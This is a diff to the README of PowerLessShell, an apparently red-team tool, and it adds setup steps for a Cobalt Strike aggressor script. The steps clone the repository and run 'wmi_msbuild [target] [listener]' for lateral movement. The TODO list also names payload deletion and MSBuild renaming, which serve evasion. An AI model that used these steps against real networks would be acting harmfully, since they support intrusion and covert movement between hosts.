@@ -44,15 +44,25 @@ The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-
 ![PowerLessShell](https://ringzer0team.com/powershellless.png)
 
 # Cobalt Strike Aggressor script (wmi_msbuild.cna) By MrT-F
-```
-In the beacon console once the cna script is uploaded on the team server
 
-use macro "wmi_msbuild [target] [listener]"
+cd into your cobalt strike client directory
+```
+cd /root/cobaltstrike
+```
+Clone this repository into folder PowerLessShell
+```
+mkdir PowerLessShell
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git PowerLessShell
+```
+Load the aggressor script in your Cobalt Strike Console
+Laterally move just like other Cobalt Strike macros:
+```
+wmi_msbuild [target] [listener]
 ```
 
 # TODO 
-Use impacket library to automate the file push and execution of the msbuild command.
-
+* MsBuild renaming
+* Delete payload
 # Credit
 Mr.Un1k0d3r RingZer0 Team 2017
 
